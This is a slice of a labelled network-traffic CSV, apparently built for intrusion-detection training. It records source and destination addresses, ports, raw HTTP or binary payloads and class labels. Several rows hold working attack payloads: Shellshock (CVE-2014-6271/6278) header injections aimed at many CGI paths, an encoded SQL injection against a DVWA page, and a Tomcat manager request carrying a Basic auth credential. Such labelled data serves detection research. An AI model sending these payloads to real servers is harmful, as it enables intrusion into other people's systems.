idx,s_ip,s_port,d_ip,d_port,protocol,payload,risk,class
715,9.185.231.180,35504,209.236.172.102,80,TCP( 6 ),GET /cgi.cgi/ HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\n\r\nGET /cgi.cgi/admin.cgi HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /cgi.cgi/administrator.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /cgi.cgi/authLogin.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /cgi.cgi/bb-hist.sh HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /cgi.cgi/banner.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /cgi.cgi/book.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /cgi.cgi/cgiinfo.cgi HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /cgi.cgi/cgitest.py HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\n\r\nGET /cgi.cgi/cgi_wrapper HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\n\r\nGET /cgi.cgi/contact.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /cgi.cgi/count.cgi HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /cgi.cgi/defaultwebpage.cgi HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\n\r\nGET /cgi.cgi/download.cgi HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\n\r\nGET /cgi.cgi/entropysearch.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /cgi.cgi/env.cgi HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\n\r\nGET /cgi.cgi/environment.cgi HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /cgi.cgi/ezmlm-browse HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /cgi.cgi/formmail.cgi,1,2_exploit
716,9.100.45.247,60582,185.242.45.59,80,TCP( 6 ),GET /cgi-sys/welcome HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\n\r\nGET /cgi-sys/whois.cgi HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /cgi-sys/ HTTP/1.1\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /cgi-local/ HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\n\r\nGET /cgi-local/admin.cgi HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\n\r\nGET /cgi-local/administrator.cgi HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /cgi-local/authLogin.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\n\r\nGET /cgi-local/bb-hist.sh HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\n\r\nGET /cgi-local/banner.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /cgi-local/book.cgi HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /cgi-local/cgiinfo.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /cgi-local/cgitest.py HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\n\r\nGET /cgi-local/cgi_wrapper HTTP/1.1\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\n\r\nGET /cgi-local/contact.cgi HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /cgi-local/count.cgi HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\n\r\nGET /cgi-local/defaultwebpage.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\n\r\nGET /cgi-local/download.cgi HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /cgi-local/entropysearch.cgi HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\n\r\nGET /cgi-loca,1,2_exploit
717,7.209.91.184,48150,168.138.157.64,80,TCP( 6 ),GET /webcgi/ruby.rb HTTP/1.1\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\n\r\nGET /webcgi/search HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /webcgi/search.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /webcgi/server.php HTTP/1.1\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /webcgi/status HTTP/1.1\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\n\r\nGET /webcgi/sysinfo.pl HTTP/1.1\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /webcgi/test HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\n\r\nGET /webcgi/test-cgi HTTP/1.1\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /webcgi/test.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /webcgi/test_cgi.php HTTP/1.1\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\n\r\nGET /webcgi/test.cgi.php HTTP/1.1\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\n\r\nGET /webcgi/test_cgi.pl HTTP/1.1\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\n\r\nGET /webcgi/test-cgi.pl HTTP/1.1\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /webcgi/test.py HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /webcgi/test.sh HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /webcgi/tmUnblock.cgi HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /webcgi/uname.cgi HTTP/1.1\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\n\r\nGET /webcgi/viewcvs.cgi HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\n\r\nGET /webcgi/welcome HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-201,1,2_exploit
718,112.56.168.61,15464,200.252.51.156,8080,TCP( 6 ),"GET /manager/html HTTP/1.1\r\nHost: 172.16.1.80:8080\r\nCache-Control: max-age=0\r\nAuthorization: Basic YWRtaW46dHR0dHR0dA==\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\nCookie: JSESSIONID=188F8C229EAD4FC819679F4ECD0789CB; JSESSIONID=CC45C29586478AE7E3777E6B7681F619\r\nConnection: close\r\n\r\n",1,3_post
719,86.203.36.135,80,118.8.81.86,57458,TCP,"HTTP/1.1 403 Forbidden
Date: Thu, 28 Jul 2022 08:20:31 GMT
Server: Apache/2.4.6 (CentOS)
Last-Modified: Thu, 16 Oct 2014 13:20:58 GMT
ETag: ""1321-5058a1e728280""
Accept-Ranges: bytes
Content-Length: 4897
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd""><html><head>
<meta http-equiv=""content-type"" content=""text/html; charset=UTF-8"">
..<title>Apache HTTP Server Test Page powered by CentOS</title>
..<meta http-equiv=""Content-Type"" content=""text/html; charset=UTF-8"">

    <!-- Bootstrap -->
    <link href=""/noindex/css/bootstrap.min.css"" rel=""stylesheet"">
    <link rel=""stylesheet"" href=""noindex/css/open-sans.css"" type=""text/css"" />

<style type=""text/css""><!--.. 

body {
  font-family: ""Open Sans"", Helvetica, sans-serif;
  font-weight: 100;
  color: #ccc;
  background: rgba(10, 24, 55, 1);
  font-size: 16px;
}

h2, h3, h4 {
  font-weight: 200;
}

h2 {
  font-size: 28px;
}

.jumbotron {
  margin-bottom: 0;
  color: #333;
  background: rgb(212,212,221); /* Old browsers */
  background: radial-gradient(ellipse at center top, rgba(255,255,255,1) 0%,rgba(174,174,183,1) 100%); /* W3C */
}

.jumbotron h1 {
  font-size: 128px;
  font-weight: 700;
  color: white;
  text-shadow: 0px 2px 0px #abc,
               0px 4px 10px rgba(0,0,0,0.15),
               0px 5px 2px rgba(0,0,0,0.1),
               0px 6px 30px rgba(0,0,0,0.1);
}

.jumbotron p {
  font-size: 28px;
  font-weight: 100;
}

.main {
   background: white;
   color: #234;
   border-top: 1px solid rgba(0,0,0,0.12);
   padding-top: 30px;
   padding-bottom: 40px;
}

.footer {
   border-top: 1px solid rgba(255,255,255,0.2);
   padding-top: 30px;
}

    --></style>
</head>
<body>
  <div class=""jumbotron text-center"">
    <div class=""container"">
   .  <h1>Testing 123..</h1>
  ..<p class=""lead"">This page is used to test the proper operation of the <a href=""http://apache.org"">Apache HTTP server</a> after it has been installed. If you can read this page it means that this site is working properly. This server is powered by <a href=""http://centos.org"">CentOS</a>.</p>
..</div>
  </div>
  <div class=""main"">
    <div class=""container"">
       <div class=""row"">
  ...<div class=""col-sm-6"">
    ...<h2>Just visiting?</h2>
...  ..<p class=""lead"">The website you just visited is either experiencing problems or is undergoing routine maintenance.</p>
  .....<p>If you would like to let the administrators of this website know that you've seen this page instead of the page you expected, you should send them e-mail. In general, mail sent to the name ""webmaster"" and directed to the website's domain should reach the appropriate person.</p>
  .....<p>For example, if you experienced problems while visiting www.example.com, you should send e-mail to ""webmaster@example.com"".</p>
.  ...</div>
  ....<div class=""col-s",2,2_exploit
720,158.138.173.42,47760,97.68.216.90,37430,TCP,......(,2,4_unknown
721,216.183.125.243,3389,78.118.155.85,40046,TCP( 6 ),".........4.............A...M..a....0B....R.e..5.....]/..{..... .'......D.~l....}.[v..).k....;.../..................0...0..........a....i_.O...Ae..0\r..*.H..\r.....0.1.0...U...\rWIN-webServer0..\r210722081657Z.\r220121081657Z0.1.0...U...\rWIN-webServer0..\""0\r..*.H..\r..........0..\n......E..\r{$.E..T..O.F3}f.5K.....|..<gl..D@W....._.>S...)\"".....O..w..e........\r.5...*..n..V\nNd.!..1..Y...?..8.|.h..*]..:...........i..I.&.nV.%..b(/.Rh-....J|S0@...^.qzY_|..,.UB../-'.&)......,+d...TV..P.x^,...j9M.x.3..E.N.>..@..}...ZBSVp.&..I.....HHP......._j_........$0\""0...U.%..0\n..+.......0...U.......00\r..*.H..\r.........._........8..'Qs.gT...M4......DsH......QlL....au...q.a.U.,H)..~_%8N.v...r..@.7Y.c.f.......<KE..F......g..X.......-u...P.ct...RO.\n..........y.i....\\'f:W........<....?_.P..k[....k..........'!.\"".^.3<.R...........y...L..'vF.!)Sz.#}.....]....88.C.d._..E<../@Fd................0.+C..v,u.b....@.'aU...*........H.0.V.....a....p..........di.C.3.\""...k.i....P.\n.e.......A:..........3..(+.<...j....`.?l...y....../......t)i...I1..ja..u;..(.oA..........F.H....RC......>l....X.?...H.U/2n.v..1..U.D....#.Ei.....8.u..p....w`.}..NPs..Z..}..e.O.{...Rdk.m..hF\n.0.'<..'.....Q.f8.3...5j.dM.1T....Q...}...J.^..^oz8r5F.r..... 7M_y.....x.%.....b.Q...#.S.c-.k.",3,3_post
722,95.84.146.110,47760,152.37.51.167,36332,TCP,......(,2,4_unknown
723,40.100.43.90,47760,199.133.247.215,48286,TCP,......(,2,4_unknown
724,150.126.170.65,47760,21.28.48.132,44472,TCP,......(,2,4_unknown
725,124.225.234.151,47760,165.10.79.164,48394,TCP,......(,2,4_unknown
726,30.25.19.67,3389,96.157.105.127,37030,TCP( 6 ),.........4.........,3,3_post
727,179.207.240.121,36508,82.25.234.169,80,TCP( 6 ),"GET /vulnerabilities/sqli/?id=1%27%20AND%203397%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283397%3D3397%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27rABJ%27%3D%27rABJ&Submit=Submit HTTP/1.1\r\nCache-Control: no-cache\r\nCookie: PHPSESSID=qplh0gknlcq19vk0flovac8il1; security=low\r\nUser-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36\r\nHost: 172.16.1.50\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close\r\n\r\n",1,2_exploit
728,199.255.248.43,56556,137.169.29.179,80,TCP( 6 ),GET /cgis/env.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\n\r\nGET /cgis/environment.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\n\r\nGET /cgis/ezmlm-browse HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /cgis/formmail.cgi HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\n\r\n,1,2_exploit
729,199.25.215.155,47760,152.87.129.254,55016,TCP,......(,2,4_unknown
730,218.149.182.211,47760,185.205.85.61,48992,TCP,......(,2,4_unknown
731,101.35.187.35,47760,15.169.182.121,42168,TCP,......(,2,4_unknown
732,44.150.17.189,47760,120.131.9.34,53300,TCP,......(,2,4_unknown
733,218.59.215.203,57216,145.255.212.231,80,TCP( 6 ),HEAD / HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: close\r\nUser-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\r\n\r\n,1,1_reconnaissance
734,182.150.144.172,47760,84.81.76.96,48606,TCP,......(,2,4_unknown
735,14.185.29.188,47760,121.21.21.118,51546,TCP,......(,2,4_unknown
